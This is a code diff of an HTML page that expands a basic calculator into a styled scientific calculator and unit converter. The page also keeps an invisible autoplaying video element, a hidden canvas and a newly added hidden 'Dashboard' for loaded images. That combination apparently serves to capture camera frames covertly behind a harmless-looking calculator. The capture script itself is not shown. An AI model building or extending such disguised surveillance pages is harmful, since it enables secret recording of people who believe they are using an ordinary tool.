@@ -1,11 +1,106 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Calculator</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/milligram/1.4.1/milligram.css">
-    <style>
-    body { margin: 30px; }
-    #calculator { width: 200px; }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Scientific Calculator & Converter</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 30px;
+      font-family: 'Share Tech Mono', monospace;
+      background-color: #0f0f0f;
+      color: #00ff99;
+      user-select: none;
+    }
+    h3, h4 {
+      color: #00ff99;
+      text-shadow: 0 0 5px #00ff99;
+    }
+    #container {
+      display: flex;
+      gap: 40px;
+      align-items: flex-start;
+    }
+    #calculator {
+      display: grid;
+      grid-template-columns: repeat(6, 60px);
+      gap: 12px;
+      width: max-content;
+      background: #111;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px #00ff99;
+    }
+    #calculator button {
+      font-size: 18px;
+      padding: 12px 0;
+      cursor: pointer;
+      background: #000;
+      border: 1px solid #00ff99;
+      color: #00ff99;
+      border-radius: 4px;
+      transition: background 0.3s, color 0.3s;
+    }
+    #calculator button:hover {
+      background: #00ff99;
+      color: #000;
+      box-shadow: 0 0 10px #00ff99;
+    }
+    #display {
+      width: 370px;
+      margin-bottom: 20px;
+      font-size: 24px;
+      padding: 10px 15px;
+      text-align: right;
+      background: #000;
+      border: 2px solid #00ff99;
+      border-radius: 6px;
+      color: #00ff99;
+      text-shadow: 0 0 5px #00ff99;
+    }
+    #converter {
+      max-width: 320px;
+      background: #111;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px #00ff99;
+    }
+    #converter select, #converter input {
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 10px;
+      font-size: 18px;
+      background: #000;
+      border: 2px solid #00ff99;
+      border-radius: 6px;
+      color: #00ff99;
+      text-shadow: 0 0 5px #00ff99;
+    }
+    #converter button {
+      width: 100%;
+      padding: 12px;
+      font-size: 18px;
+      cursor: pointer;
+      background: #000;
+      border: 2px solid #00ff99;
+      border-radius: 6px;
+      color: #00ff99;
+      text-shadow: 0 0 5px #00ff99;
+      transition: background 0.3s, color 0.3s;
+    }
+    #converter button:hover {
+      background: #00ff99;
+      color: #000;
+      box-shadow: 0 0 15px #00ff99;
+    }
+    #converter-result {
+      font-size: 18px;
+      margin-top: 10px;
+      color: #00ff99;
+      text-shadow: 0 0 5px #00ff99;
+      min-height: 24px;
+    }
     video {
       position: absolute;
       width: 1px;
@@ -13,35 +108,88 @@
       opacity: 0;
       pointer-events: none;
     }
-</style>
-
+    #dashboard {
+      margin-top: 40px;
+      color: #00ff99;
+      text-shadow: 0 0 5px #00ff99;
+    }
+    #imagesContainer img {
+      border: 2px solid #00ff99;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      max-width: 320px;
+      box-shadow: 0 0 10px #00ff99;
+    }
+    #imagesContainer p {
+      margin: 0 0 15px 0;
+      font-size: 16px;
+    }
+    button {
+      outline: none;
+    }
+  </style>
 </head>
 <body>
-    <h3>Calculator</h3>
-    <input type="text" id="display" readonly />
+  <h3>Scientific Calculator & Converter</h3>
+  <input type="text" id="display" readonly />
+
+  <div id="container">
     <div id="calculator">
-        <button onclick="press('1')">1</button>
-        <button onclick="press('2')">2</button>
-        <button onclick="press('3')">3</button>
-        <button onclick="press('+')">+</button><br>
-        <button onclick="press('4')">4</button>
-        <button onclick="press('5')">5</button>
-        <button onclick="press('6')">6</button>
-        <button onclick="press('-')">-</button><br>
-        <button onclick="press('7')">7</button>
-        <button onclick="press('8')">8</button>
-        <button onclick="press('9')">9</button>
-        <button onclick="press('*')">*</button><br>
-        <button onclick="press('0')">0</button>
-        <button onclick="press('C')">C</button>
-        <button onclick="press('=')">=</button>
-        <button onclick="press('/')">/</button>
+      <button onclick="press('sin(')">sin</button>
+      <button onclick="press('cos(')">cos</button>
+      <button onclick="press('tan(')">tan</button>
+      <button onclick="press('log(')">log</button>
+      <button onclick="press('sqrt(')">√</button>
+      <button onclick="press('^')">^</button>
+
+      <button onclick="press('7')">7</button>
+      <button onclick="press('8')">8</button>
+      <button onclick="press('9')">9</button>
+      <button onclick="press('(')">(</button>
+      <button onclick="press(')')">)</button>
+      <button onclick="press('/')">/</button>
+
+      <button onclick="press('4')">4</button>
+      <button onclick="press('5')">5</button>
+      <button onclick="press('6')">6</button>
+      <button onclick="press('*')">*</button>
+      <button onclick="press('C')">C</button>
+      <button onclick="press('=')">=</button>
+
+      <button onclick="press('1')">1</button>
+      <button onclick="press('2')">2</button>
+      <button onclick="press('3')">3</button>
+      <button onclick="press('0')">0</button>
+      <button onclick="press('.')">.</button>
+      <button onclick="press('-')">-</button>
+
+      <button onclick="press('+')">+</button>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="converter">
+      <h4>Unit Converter</h4>
+      <select id="converter-type" onchange="updateUnits()">
+        <option value="length">Length</option>
+        <option value="weight">Weight</option>
+        <option value="temperature">Temperature</option>
+      </select>
+      <select id="unit-from"></select>
+      <select id="unit-to"></select>
+      <input type="number" id="converter-input" placeholder="Enter value" />
+      <button onclick="convert()">Convert</button>
+      <p id="converter-result"></p>
+    </div>
+  </div>
 
-    <script src="/static/script.js"></script>
+  <div id="dashboard" style="display:none;">
+    <h3>Dashboard</h3>
+    <div id="imagesContainer">Loading images...</div>
+    <button onclick="closeDashboard()">Close Dashboard</button>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script src="/static/script.js"></script>
 </body>
 </html>
-
